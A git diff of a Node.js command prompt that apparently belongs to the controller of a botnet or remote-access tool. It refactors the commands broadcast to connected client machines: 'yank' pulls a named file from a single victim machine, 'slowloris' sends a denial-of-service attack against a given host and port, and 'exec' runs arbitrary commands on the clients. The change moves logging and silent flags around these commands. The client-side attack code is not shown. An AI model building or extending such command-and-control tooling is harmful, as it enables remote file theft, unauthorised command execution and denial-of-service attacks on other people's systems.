@@ -7,7 +7,6 @@ const rl = readline.createInterface({
 	output: process.stdout,
 });
 
-let logging = false;
 let fileNum = 0;
 
 export function prompt() {
@@ -29,10 +28,7 @@ export function prompt() {
 			} else if (commandArgs.first <= clientModules.clients.length) {
 				clientModules.clientInstances = [...clientModules.clients];
 				clientModules.clientInstances =
-					clientModules.clientInstances.slice(
-						0,
-						commandArgs.first
-					);
+					clientModules.clientInstances.slice(0, commandArgs.first);
 			}
 		}
 
@@ -55,29 +51,22 @@ export function prompt() {
 			}
 		}
 
-		if (message.startsWith("logging")) {
-			if (message === "logging") console.log(`logging: ${logging}`);
-			else if (commandArgs.first === "true") {
-				logging = true;
-				clientModules.silent = true;
-			} else {
-				logging = false;
-				clientModules.silent = false;
-			}
-		}
-
 		if (message === "clear") console.clear();
 
 		if (message.startsWith("yank")) {
-			if (clientModules.clientInstances.length > 1)
+			clientModules.logging = true;
+			clientModules.silent = true;
+			if (message === "yank")
+				console.log("Please provide arugments: yank (file name)");
+			else if (clientModules.clientInstances.length > 1)
 				return console.log(
 					"You can only use this command on one machine at a time"
 				);
-			else {
-				if (logging) {
+			else if (commandArgs.first !== undefined) {
+				if (clientModules.logging) {
 					fileNum++;
 					broadcast(message);
-				} else console.log("Please enable logging to use this feature");
+				}
 			}
 		}
 
@@ -90,11 +79,11 @@ export function prompt() {
 		}
 
 		if (message.startsWith("slowloris")) {
-			if (message === "slowloris") {
+			if (message === "slowloris")
 				console.log(
 					"Please provide arguments: slowloris (host) (port) (duration ms) (sockets)"
 				);
-			} else if (commandArgs.first !== undefined) {
+			else if (commandArgs.first !== undefined) {
 				broadcast(message);
 				console.log(`Attack sent!`);
 			}
@@ -110,7 +99,11 @@ export function prompt() {
 			}, duration);
 		}
 
-		if (message.startsWith("exec")) broadcast(message);
+		if (message.startsWith("exec")) {
+			broadcast(message);
+			clientModules.logging = false;
+			clientModules.silent = false;
+		}
 
 		return prompt();
 	});
